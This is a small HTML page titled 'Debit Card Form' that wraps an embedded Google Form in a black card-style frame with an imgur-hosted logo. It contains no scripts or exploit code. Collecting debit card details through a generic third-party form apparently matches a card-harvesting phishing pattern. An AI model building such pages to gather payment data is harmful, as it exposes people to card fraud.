<!DOCTYPE html>
<html>
<head>
  <title>Debit Card Form</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .card {
      width: 420px;
      height: 820px; /* adjust height to fit form */
      padding: 20px;
      background-color: #000000; /* black background */
      border-radius: 20px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }

    .card iframe {
      width: 100%;
      flex: 1;
      border: none;
      border-radius: 12px;
      margin-bottom: 15px;
    }

    .logo-bar {
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #111111;
      padding: 12px;
      border-radius: 10px;
    }

    .logo-bar img {
      height: 36px;
      width: auto;
    }

  </style>
</head>
<body>

<div class="card">
  <!-- Embed Google Form -->
  <iframe 
    src="https://docs.google.com/forms/d/e/1FAIpQLSeLOQkeADnMfApi9CY7nVq9wf-mj8Ljsm8VLbbjIO6Rg0y3AQ/viewform?embedded=true"
    frameborder="0"
    marginheight="0"
    marginwidth="0">
    Loading…
  </iframe>

  <!-- Logo bar at the bottom -->
  <div class="logo-bar">
    <img src="https://i.imgur.com/igeEdp3g.jpg" alt="Logo">
  </div>
</div>

</body>
</html>
